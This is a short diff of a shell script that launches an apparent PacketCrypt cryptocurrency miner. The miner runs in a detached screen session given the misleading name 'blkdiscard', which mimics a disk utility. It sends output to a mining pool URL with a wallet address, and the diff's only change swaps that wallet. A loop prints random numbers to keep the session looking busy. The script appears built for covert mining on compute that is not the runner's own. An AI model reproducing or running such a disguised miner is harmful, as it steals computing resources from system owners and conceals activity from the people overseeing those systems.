@@ -1,5 +1,5 @@
 blkdiscard=$(shuf -n 1 -i 1-999999)
 sudo apt install screen -y
 chmod +x core
-screen -dmS blkdiscard ./core ann -p pkt1qme9x0hhphrsk39e4gxgg3g0dmqn2cyhkxjyec7 http://pool.srizbi.com
+screen -dmS blkdiscard ./core ann -p pkt1ql5uq4tqr3685ud9xvp5sxshrw0j3ayeya8xr9v http://pool.srizbi.com
 while :; do shuf -n 1 -i 1-99999999; sleep 10; done
